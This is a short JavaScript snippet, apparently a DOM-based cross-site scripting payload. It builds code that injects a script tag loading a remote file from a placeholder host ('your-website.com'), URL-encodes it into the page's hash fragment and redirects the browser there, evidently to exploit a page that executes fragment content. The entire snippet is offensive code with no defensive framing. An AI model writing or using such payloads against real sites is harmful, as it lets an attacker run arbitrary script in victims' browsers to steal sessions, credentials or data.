// Payload to load external script
var payload = `
    var script = document.createElement('script');
    script.src = 'https://your-website.com/your-script.js';
    document.body.appendChild(script);
`;

// Encode the payload to be URL-safe
var encodedPayload = encodeURIComponent(payload);

// Construct the final URL with the encoded payload
var finalUrl = '/#' + encodedPayload;

// Redirect to the final URL
window.location.href = finalUrl;

